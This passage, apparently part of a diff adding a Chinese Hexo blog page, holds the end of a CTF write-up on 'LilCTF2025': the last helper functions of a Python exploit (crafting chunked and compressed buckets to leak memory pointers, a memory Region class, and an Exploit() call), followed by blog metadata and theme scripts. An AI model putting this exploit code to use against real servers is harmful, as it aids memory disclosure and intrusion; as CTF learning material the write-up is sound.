class="hljs-subst">&#123;x:02x&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data).upper().encode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ptr_bucket</span>(<span class="hljs-params">*ptrs, size=<span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> size <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(ptrs) * <span class="hljs-number">8</span> == size<br>    bucket = <span class="hljs-string">b&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(p64, ptrs))<br>    bucket = qpe(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = compressed_bucket(bucket)<br><br>    <span class="hljs-keyword">return</span> bucket<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">chunked_chunk</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the</span><br><span class="hljs-string">    chunked representation has size `size`.</span><br><span class="hljs-string">    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than</span><br>    <span class="hljs-comment"># enough</span><br>    <span class="hljs-keyword">if</span> size <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        size = <span class="hljs-built_in">len</span>(data) + <span class="hljs-number">8</span><br>    keep = <span class="hljs-built_in">len</span>(data) + <span class="hljs-built_in">len</span>(<span class="hljs-string">b&quot;\n\n&quot;</span>)<br>    size = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="hljs-string">&quot;0&quot;</span>)<br>    <span class="hljs-keyword">return</span> size.encode() + <span class="hljs-string">b&quot;\n&quot;</span> + data + <span class="hljs-string">b&quot;\n&quot;</span><br><br><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Region</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span><br><br>    start: <span class="hljs-built_in">int</span><br>    stop: <span class="hljs-built_in">int</span><br>    permissions: <span class="hljs-built_in">str</span><br>    path: <span class="hljs-built_in">str</span><br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">size</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.stop - <span class="hljs-variable language_">self</span>.start<br><br><br>Exploit()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260301135448097.png" srcset="/img/loading.gif" lazyload alt="image-20260301135448097"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>LilCTF2025</div>
+      <div>https://www.sunynov.top/2026/02/25/LilCTF2025/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>suny</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年2月25日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/03/04/node-js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="nodejs原型链污染">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">nodejs原型链污染</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/02/14/XXE%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/" title="XXE漏洞入门">
+                        <span class="hidden-mobile">XXE漏洞入门</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"sg2xM2g9UCt39D62pmfzcl8b-gzGzoHsz","appKey":"ludHhVlixZUIrJv11t6rmegp","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":true,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://icp.gov.moe/?keyword=20250279" target="_blank">萌ICP备20250279号</a> <br> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
